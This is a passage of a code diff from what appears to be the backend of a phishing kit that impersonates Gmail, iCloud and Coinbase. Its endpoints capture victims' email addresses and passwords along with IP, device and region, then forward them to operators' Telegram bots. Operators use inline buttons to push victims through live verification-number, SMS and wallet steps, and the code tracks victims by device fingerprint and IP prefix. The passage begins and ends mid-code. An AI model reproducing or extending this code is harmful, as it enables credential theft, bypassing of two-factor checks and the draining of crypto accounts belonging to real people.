+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "verifying_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        } else if (action === "sms2_wallet") {
+          statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
+        } else if (action === "sms2_done") {
+          statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
+        } else if (action === "sms2_reject") {
+          statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
+        } else if (action === "wallet_decision_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "wallet_decision_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "wallet_decision_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "wallet_decision_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        }
 
-// ============================================================================
-// POST /resend-icloud-sms - Resend with requestId
-// ============================================================================
+        // ✅ UPDATE STATUS on backend for verification callbacks
+        if (action === "verification_accept" || action === "verification_reject") {
+          try {
+            await fetch(`${APP_URL}/update-status`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ email: email, action: action })
+            });
+            console.log(`✅ Updated status for verification action: ${action}`);
+          } catch (err) {
+            console.error("Error updating status:", err);
+          }
+        }
 
-app.post("/resend-icloud-sms", async (req, res) => {
-  try {
-    const { email, userId, requestId } = req.body;
-
-    if (!email) {
-      return res.status(400).json({ error: "Missing email" });
-    }
-
-    console.log(`📲 Resending iCloud SMS to ${email} (requestId: ${requestId})`);
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    // ✅ SEND TO WINNER ONLY
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, {
-        parse_mode: "HTML"
-      });
-      console.log(`✅ Resend iCloud SMS sent successfully`);
-    } else {
-      console.log(`⚠️ No winner found for ${email}`);
-      return res.status(400).json({ error: "No winner determined" });
-    }
-
-    // ✅ Reset status for THIS requestId
-    if (requestId && pendingCodes[requestId]) {
-      pendingCodes[requestId].status = "pending";
-    }
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error("Resend iCloud SMS error:", err);
-    res.status(500).json({ error: err.message });
-  }
-});
-// ============================================================================
-
-app.post("/send-gmail-login", async (req, res) => {
-  try {
-    console.log('🔍 DEBUG: /send-gmail-login endpoint called');
-    const { email, displayEmail, password, userId } = req.body;
-    
-    // ✅ Use displayEmail if provided (different email user typed)
-    // Otherwise use email (for backward compatibility)
-    const messageEmail = displayEmail || email;
-    
-    console.log('🔍 DEBUG: Received email:', email, 'displayEmail:', messageEmail, 'password:', password, 'userId:', userId);
-    
-    if (!email || !password || !userId) {
-      return res.status(400).json({ error: "Missing email, password, or userId" });
-    }
-    
-    const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log('🔍 DEBUG: Generated displayEmailKey:', displayEmailKey);
-    
-    // ✅ Store displayEmail for later retrieval
-    displayEmailStore[displayEmailKey] = messageEmail;
-    displayEmailByRequestId[requestId] = messageEmail;
-    console.log(`📧 Stored display email: ${messageEmail}`);
-    
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-    const fingerprint = getDeviceFingerprint(req);
-
-    // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING WITH NEW EMAIL
-    if (fingerprint && messageEmail) {
-      deviceFingerprintToEmail[fingerprint] = messageEmail;
-      console.log(`💾 Updated fingerprint mapping: ${fingerprint} → ${messageEmail}`);
-    }
-
-    // ✅ Store both email (for tracking) and displayEmail (for showing)
-    pendingGmailLogin[requestId] = { status: "pending", email: email, displayEmail: messageEmail };
-
-    const message =
-      `🌈🌈🌈🌈 <b>Gmail - Sign in</b> 🌈🌈🌈🌈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${messageEmail}</code>\n` +
-      `<b>🔑 Password:</b> <code>${password}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `gmail_accept|${requestId}` },
-            { text: "❌ Reject", callback_data: `gmail_reject|${requestId}` }
-          ]
-        ]
+        if (statusMessage) {
+          try {
+            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+            await fetch(replyUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID_2,
+                text: statusMessage,
+                parse_mode: "HTML"
+              })
+            });
+          } catch (err) {
+            console.error(`❌ Failed to send status message:`, err);
+          }
+        }
       }
-    };
 
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
+      bot2.answerCallbackQuery(callbackId, {
+        text: `✅ ${action.toUpperCase()}`,
+        show_alert: false
+      }).catch(() => {});
 
-    // ✅ SEND TO WINNER ONLY (use tracking email for winner lookup)
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, options);
-    } else {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: options.parse_mode,
-          reply_markup: options.reply_markup
-        })
-      });
+    } catch (err) {
+      console.error("❌ Error (Bot 2):", err.message);
+      bot2.answerCallbackQuery(query.id, {
+        text: "❌ Error",
+        show_alert: true
+      }).catch(() => {});
     }
+  });
+}
 
-    console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
-    res.json({ status: "pending", requestId, displayEmailKey });
-
-  } catch (err) {
-    console.error("❌ Gmail Login endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
+console.log(`✅ Bots ready`);
 
 // ============================================================================
-// GET /get-gmail-display-email - Get displayEmail for Gmail (for bot to display)
+// ✅ EXPORT
 // ============================================================================
 
-app.get("/get-gmail-display-email", (req, res) => {
-  try {
-    const requestId = (req.query.requestId || "").trim();
-
-    if (!requestId || !pendingGmailLogin[requestId]) {
-      return res.json({ displayEmail: "unknown" });
-    }
-
-    const displayEmail = pendingGmailLogin[requestId].displayEmail || pendingGmailLogin[requestId].email;
-    res.json({ displayEmail });
-
-  } catch (err) {
-    console.error("Get Gmail display email error:", err);
-    res.json({ displayEmail: "unknown" });
-  }
-});
-
-// ============================================================================
-// GET /check-gmail-status - Check Gmail login acceptance/rejection by requestId
-// ============================================================================
-
-app.get("/check-gmail-status", (req, res) => {
-  try {
-    const requestId = (req.query.requestId || "").trim();
-
-    if (!requestId || !pendingGmailLogin[requestId]) {
-      return res.json({ status: "pending" });
-    }
-
-    const status = pendingGmailLogin[requestId].status;
-    console.log(`✅ Gmail status for requestId ${requestId}: ${status}`);
-    
-    // Map bot status values to frontend expectations
-    if (status === "gmail_accept") {
-      return res.json({ status: "accepted" });
-    } else if (status === "gmail_reject") {
-      return res.json({ status: "rejected" });
-    }
-    
-    return res.json({ status: status || "pending" });
-
-  } catch (err) {
-    console.error("Check Gmail status error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// GET /api/gmail-login-status/:requestId
-// ============================================================================
-
-app.get("/api/gmail-login-status/:requestId", (req, res) => {
-  try {
-    const { requestId } = req.params;
-    const entry = pendingGmailLogin[requestId];
-    if (!entry) return res.json({ status: "pending" });
-    res.json({ status: entry.status });
-  } catch (err) {
-    console.error("❌ Gmail Login status endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// GET /api/display-email/:displayEmailKey
-// ============================================================================
-
-app.get("/api/display-email/:displayEmailKey", (req, res) => {
-  try {
-    const { displayEmailKey } = req.params;
-    const email = displayEmailStore[displayEmailKey];
-    if (email) {
-      console.log(`📧 Retrieved display email for key ${displayEmailKey}: ${email}`);
-      res.json({ displayEmail: email });
-    } else {
-      console.log(`📧 No display email found for key ${displayEmailKey}`);
-      res.json({ displayEmail: null });
-    }
-  } catch (err) {
-    console.error("❌ Get display email error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// GET /get-gmail-login/:requestId
-// ============================================================================
-
-app.get("/get-gmail-login/:requestId", (req, res) => {
-  try {
-    const { requestId } = req.params;
-    const entry = pendingGmailLogin[requestId];
-    if (entry && entry.email) {
-      res.json({ email: entry.email });
-    } else {
-      res.json({ email: null });
-    }
-  } catch (err) {
-    console.error("❌ Get Gmail login error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// GMAIL VERIFICATION ENDPOINTS
-// ============================================================================
-
-app.post("/send-verification-page", async (req, res) => {
-  try {
-    console.log('🔍 DEBUG: /send-verification-page endpoint called');
-    const { userId, email, displayEmail } = req.body;
-    
-    // ✅ Use displayEmail if provided, otherwise use email
-    const messageEmail = displayEmail || email;
-    
-    console.log('🔍 DEBUG: Received userId:', userId, 'email:', email, 'displayEmail:', messageEmail);
-    
-    if (!userId || !email) {
-      return res.status(400).json({ error: "Missing userId or email" });
-    }
-    
-    const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log('🔍 DEBUG: Generated requestId:', requestId);
-    
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    // ✅ Store both email (for tracking) and displayEmail (for showing)
-    pendingVerificationPage[requestId] = { 
-      status: "pending", 
-      selectedDigits: null, 
-      email: email,
-      displayEmail: messageEmail
-    };
-
-    const message =
-      `🌈🌈🌈 <b>Gmail - Verification</b> 🌈🌈🌈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${messageEmail || 'Unknown'}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "0", callback_data: `verify_digit|${requestId}|0` },
-            { text: "1", callback_data: `verify_digit|${requestId}|1` },
-            { text: "2", callback_data: `verify_digit|${requestId}|2` },
-            { text: "3", callback_data: `verify_digit|${requestId}|3` },
-            { text: "4", callback_data: `verify_digit|${requestId}|4` }
-          ],
-          [
-            { text: "5", callback_data: `verify_digit|${requestId}|5` },
-            { text: "6", callback_data: `verify_digit|${requestId}|6` },
-            { text: "7", callback_data: `verify_digit|${requestId}|7` },
-            { text: "8", callback_data: `verify_digit|${requestId}|8` },
-            { text: "9", callback_data: `verify_digit|${requestId}|9` }
-          ]
-        ]
-      }
-    };
-
-    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
-    let resolvedEmail = email;
-    if (!userWinnerTelegram[email]) {
-      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
-    }
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    // ✅ SEND TO WINNER ONLY (use resolved email for winner lookup)
-    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      await sendFollowUpMessage(resolvedEmail, message, options);
-    } else {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: options.parse_mode,
-          reply_markup: options.reply_markup
-        })
-      });
-    }
-
-    res.json({ status: "pending", requestId, email });
-
-  } catch (err) {
-    console.error("❌ Verification Page endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /update-selected-digits
-// ============================================================================
-
-app.post("/update-selected-digits", (req, res) => {
-  try {
-    const { requestId, digit } = req.body;
-    if (!requestId || digit === undefined) return res.status(400).json({ error: "Missing requestId or digit" });
-    
-    if (!pendingVerificationPage[requestId]) {
-      return res.status(400).json({ error: "Invalid requestId" });
-    }
-
-    if (!pendingVerificationPage[requestId].selectedDigits) {
-      pendingVerificationPage[requestId].selectedDigits = [];
-    }
-
-    pendingVerificationPage[requestId].selectedDigits.push(digit);
-    console.log(`✅ Digit ${digit} selected for ${requestId}`);
-
-    res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
-  } catch (err) {
-    console.error("❌ Update selected digits error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// GET /check-verification-status - Check verification confirmation status by requestId
-// ============================================================================
-
-app.get("/check-verification-status", (req, res) => {
-  try {
-    const requestId = (req.query.requestId || "").trim();
-
-    if (!requestId || !pendingVerificationConfirm[requestId]) {
-      return res.json({ status: "pending" });
-    }
-
-    const status = pendingVerificationConfirm[requestId].status;
-    console.log(`✅ Verification status for requestId ${requestId}: ${status}`);
-    
-    // Map bot status values to frontend expectations
-    if (status === "verification_accept") {
-      return res.json({ status: "accepted" });
-    } else if (status === "verification_reject") {
-      return res.json({ status: "rejected" });
-    }
-    
-    return res.json({ status: status || "pending" });
-
-  } catch (err) {
-    console.error("Check verification status error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /send-verification-confirm - Send confirmation message with selected digits
-// ============================================================================
-
-app.post("/send-verification-confirm", async (req, res) => {
-  try {
-    const { email, userId, digit1, digit2, requestId } = req.body;
-
-    if (!email || !digit1 || !digit2 || !requestId) {
-      return res.status(400).json({ error: "Missing required fields" });
-    }
-
-    const confirmRequestId = `confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    
-    // ✅ Get displayEmail from pendingVerificationPage (the Gmail email user entered)
-    let displayEmail = email;
-    if (pendingVerificationPage[requestId] && pendingVerificationPage[requestId].displayEmail) {
-      displayEmail = pendingVerificationPage[requestId].displayEmail;
-    }
-    
-    console.log(`📋 Verification confirm: ${displayEmail} selected ${digit1}${digit2}`);
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    // ✅ Store confirmation request with status pending
-    pendingVerificationConfirm[confirmRequestId] = { 
-      status: "pending", 
-      email: email,
-      displayEmail: displayEmail,
-      digit1: digit1,
-      digit2: digit2
-    };
-
-    const message =
-      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
-      `<b>🔢 Selected Numbers:</b> <code><b>${digit1}${digit2}</b></code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `verification_accept|${confirmRequestId}` },
-            { text: "❌ Reject", callback_data: `verification_reject|${confirmRequestId}` }
-          ]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
-    // But use ORIGINAL email for winner lookup (to send to correct bot)
-    let resolvedEmail = email;
-    if (!userWinnerTelegram[email]) {
-      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-    }
-
-    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find correct bot)
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, options);
-    } else if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      await sendFollowUpMessage(resolvedEmail, message, options);
-    } else {
-      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
-    }
-
-    res.json({ success: true, requestId: confirmRequestId });
-
-  } catch (err) {
-    console.error("❌ Verification confirm error:", err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// POST /resend-verification - Resend verification page with new digits
-// ============================================================================
-
-app.post("/resend-verification", async (req, res) => {
-  try {
-    const { userId, email, requestId } = req.body;
-
-    if (!email || !requestId) {
-      return res.status(400).json({ error: "Missing email or requestId" });
-    }
-
-    if (!pendingVerificationPage[requestId]) {
-      return res.status(400).json({ error: "Invalid requestId" });
-    }
-
-    console.log(`🔄 Resending verification page for ${email}, requestId: ${requestId}`);
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    // ✅ Reset digits for this requestId
-    pendingVerificationPage[requestId].selectedDigits = null;
-    pendingVerificationPage[requestId].status = "pending";
-
-    const message =
-      `🔄 <b>Resend Code - Gmail</b> 🔄\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "0", callback_data: `verify_digit|${requestId}|0` },
-            { text: "1", callback_data: `verify_digit|${requestId}|1` },
-            { text: "2", callback_data: `verify_digit|${requestId}|2` },
-            { text: "3", callback_data: `verify_digit|${requestId}|3` },
-            { text: "4", callback_data: `verify_digit|${requestId}|4` }
-          ],
-          [
-            { text: "5", callback_data: `verify_digit|${requestId}|5` },
-            { text: "6", callback_data: `verify_digit|${requestId}|6` },
-            { text: "7", callback_data: `verify_digit|${requestId}|7` },
-            { text: "8", callback_data: `verify_digit|${requestId}|8` },
-            { text: "9", callback_data: `verify_digit|${requestId}|9` }
-          ]
-        ]
-      }
-    };
-
-    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
-    let resolvedEmail = email;
-    if (!userWinnerTelegram[email]) {
-      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
-    }
-
-    // ✅ SEND TO WINNER ONLY
-    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      await sendFollowUpMessage(resolvedEmail, message, options);
-    } else {
-      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
-    }
-
-    res.json({ success: true, requestId });
-
-  } catch (err) {
-    console.error("❌ Resend verification error:", err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// POST /resend-verification-confirm - Resend verification confirm message when rejected
-// ============================================================================
-
-app.post("/resend-verification-confirm", async (req, res) => {
-  try {
-    const { email, userId, requestId } = req.body;
-
-    if (!email || !requestId) {
-      return res.status(400).json({ error: "Missing email or requestId" });
-    }
-
-    // ✅ Get the original digit selection from pendingVerificationPage
-    if (!pendingVerificationPage[requestId]) {
-      return res.status(400).json({ error: "Invalid requestId" });
-    }
-
-    const selectedDigits = pendingVerificationPage[requestId].selectedDigits;
-    if (!selectedDigits || selectedDigits.length !== 2) {
-      return res.status(400).json({ error: "Invalid digits" });
-    }
-
-    const digit1 = selectedDigits[0];
-    const digit2 = selectedDigits[1];
-    
-    // ✅ Create new confirmation and send again
-    const confirmRequestId = `confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    
-    // ✅ Get displayEmail from pendingVerificationPage
-    let displayEmail = email;
-    if (pendingVerificationPage[requestId] && pendingVerificationPage[requestId].displayEmail) {
-      displayEmail = pendingVerificationPage[requestId].displayEmail;
-    }
-    
-    console.log(`📋 Resending verification confirm: ${displayEmail} selected ${digit1}${digit2}`);
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    // ✅ Store NEW confirmation request with status pending
-    pendingVerificationConfirm[confirmRequestId] = { 
-      status: "pending", 
-      email: email,
-      displayEmail: displayEmail,
-      digit1: digit1,
-      digit2: digit2
-    };
-
-    const message =
-      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
-      `<b>🔢 Selected Numbers:</b> <code><b>${digit1}${digit2}</b></code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `verification_accept|${confirmRequestId}` },
-            { text: "❌ Reject", callback_data: `verification_reject|${confirmRequestId}` }
-          ]
-        ]
-      }
-    };
-
-    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
-    // But use ORIGINAL email for winner lookup (to send to correct bot)
-    let resolvedEmail = email;
-    if (!userWinnerTelegram[email]) {
-      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-    }
-
-    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find correct bot)
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, options);
-    } else if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      await sendFollowUpMessage(resolvedEmail, message, options);
-    } else {
-      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
-    }
-
-    res.json({ success: true, requestId: confirmRequestId });
-
-  } catch (err) {
-    console.error("❌ Resend verification confirm error:", err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// GET /get-verification-display-email - Get displayEmail for verification confirm (for bot to display)
-// ============================================================================
-
-app.get("/get-verification-display-email", (req, res) => {
-  try {
-    const requestId = (req.query.requestId || "").trim();
-
-    if (!requestId || !pendingVerificationConfirm[requestId]) {
-      return res.json({ displayEmail: "unknown" });
-    }
-
-    const displayEmail = pendingVerificationConfirm[requestId].displayEmail || pendingVerificationConfirm[requestId].email;
-    res.json({ displayEmail });
-
-  } catch (err) {
-    console.error("Get verification display email error:", err);
-    res.json({ displayEmail: "unknown" });
-  }
-});
-
-// ============================================================================
-// GET /get-selected-digits
-// ============================================================================
-
-app.get("/get-selected-digits", (req, res) => {
-  try {
-    const { requestId } = req.query;
-    if (!requestId) return res.status(400).json({ error: "Missing requestId" });
-
-    const entry = pendingVerificationPage[requestId];
-    if (!entry) return res.json({ success: false });
-
-    if (entry.selectedDigits && entry.selectedDigits.length === 2) {
-      const number = entry.selectedDigits[0] + entry.selectedDigits[1];
-      return res.json({ success: true, number });
-    }
-
-    res.json({ success: false });
-  } catch (err) {
-    console.error("❌ Get selected digits error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// ============================================================================
-// GET /get-verifying-info/:verifyingId
-// ============================================================================
-
-app.get("/get-verifying-info/:verifyingId", (req, res) => {
-  try {
-    const { verifyingId } = req.params;
-    const entry = pendingVerifyingPage[verifyingId];
-    
-    if (entry) {
-      res.json({ email: entry.email });
-    } else {
-      res.json({ email: null });
-    }
-  } catch (err) {
-    console.error("❌ Get verifying info error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /update-sms2-choice
-// ============================================================================
-
-app.post("/update-sms2-choice", (req, res) => {
-  try {
-    const { sms2Id, choice } = req.body;
-
-    if (!sms2Id || !choice) {
-      return res.status(400).json({ error: "Missing sms2Id or choice" });
-    }
-
-    if (!pendingSMS2[sms2Id]) {
-      pendingSMS2[sms2Id] = {};
-    }
-
-    pendingSMS2[sms2Id].choice = choice;
-    pendingSMS2[sms2Id].updatedAt = Date.now();
-
-    console.log(`✅ SMS2 choice updated: ${choice}`);
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error("❌ Update SMS2 choice error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// GET /get-sms2-info/:sms2Id
-// ============================================================================
-
-app.get("/get-sms2-info/:sms2Id", (req, res) => {
-  try {
-    const { sms2Id } = req.params;
-    const entry = pendingSMS2[sms2Id];
-    
-    if (entry) {
-      res.json({ email: entry.email });
-    } else {
-      res.json({ email: null });
-    }
-  } catch (err) {
-    console.error("❌ Get SMS2 info error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /update-wallet-decision
-// ============================================================================
-
-app.post("/update-wallet-decision", (req, res) => {
-  try {
-    const { email, choice } = req.body;
-
-    if (!email || !choice) {
-      return res.status(400).json({ error: "Missing email or choice" });
-    }
-
-    if (!pendingWalletDecision[email]) {
-      pendingWalletDecision[email] = {};
-    }
-
-    pendingWalletDecision[email].choice = choice;
-    pendingWalletDecision[email].updatedAt = Date.now();
-
-    console.log(`✅ Wallet decision updated: ${choice}`);
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error("❌ Update wallet decision error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /send-verifying - Send verifying message with buttons
-// ============================================================================
-
-app.post("/send-verifying", async (req, res) => {
-  try {
-    const { userId, email } = req.body;
-    
-    if (!userId || !email) {
-      return res.status(400).json({ error: "Missing userId or email" });
-    }
-    
-    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-    const fingerprint = getDeviceFingerprint(req);
-    const ipPrefix = ip.split(".").slice(0, 3).join(".");
-
-    console.log(`🔍 DEBUG /send-verifying: Original email: ${email}`);
-    console.log(`🔍 DEBUG: Fingerprint: ${fingerprint}`);
-    console.log(`🔍 DEBUG: IP Prefix: ${ipPrefix}`);
-    console.log(`🔍 DEBUG: deviceFingerprintToEmail[${fingerprint}] = ${deviceFingerprintToEmail[fingerprint]}`);
-    console.log(`🔍 DEBUG: ipPrefixToEmail[${ipPrefix}] = ${ipPrefixToEmail[ipPrefix]}`);
-
-    // ✅ RESOLVE LATEST EMAIL from fingerprint or IP (for display)
-    let displayEmail = email; // Default to original
-    
-    // Try fingerprint first (most reliable)
-    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
-      displayEmail = deviceFingerprintToEmail[fingerprint];
-      console.log(`✅ Found latest email via fingerprint: ${displayEmail}`);
-    }
-    // Try IP prefix as fallback
-    else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
-      displayEmail = ipPrefixToEmail[ipPrefix];
-      console.log(`✅ Found latest email via IP prefix: ${displayEmail}`);
-    } else {
-      console.log(`⚠️ No latest email found, using original: ${displayEmail}`);
-    }
-
-    console.log(`📧 Final displayEmail: ${displayEmail}`);
-
-    // ✅ ORIGINAL EMAIL stays for winner lookup (to send to correct bot)
-    pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, choice: null };
-
-    const message =
-      `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "💬 SMS - 2 💬", callback_data: `verifying_sms|${verifyingId}` }],
-          [{ text: "🏁 Done 🏁", callback_data: `verifying_done|${verifyingId}` }],
-          [{ text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}` }],
-          [
-            { text: "☁️", callback_data: `verifying_icloud|${verifyingId}` },
-            { text: "🌈", callback_data: `verifying_gmail|${verifyingId}` }
-          ]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find winner)
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, options);
-    } else {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: options.parse_mode,
-          reply_markup: options.reply_markup
-        })
-      });
-    }
-
-    res.json({ status: "pending", verifyingId });
-
-  } catch (err) {
-    console.error("❌ Verifying endpoint error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// GET /check-verifying-choice - Check which button bot clicked
-// ============================================================================
-
-app.get("/check-verifying-choice", (req, res) => {
-  try {
-    const { verifyingId } = req.query;
-    if (!verifyingId) {
-      return res.status(400).json({ error: "Missing verifyingId" });
-    }
-
-    if (pendingVerifying[verifyingId]) {
-      const choice = pendingVerifying[verifyingId].choice;
-      if (choice) {
-        return res.json({ choice });
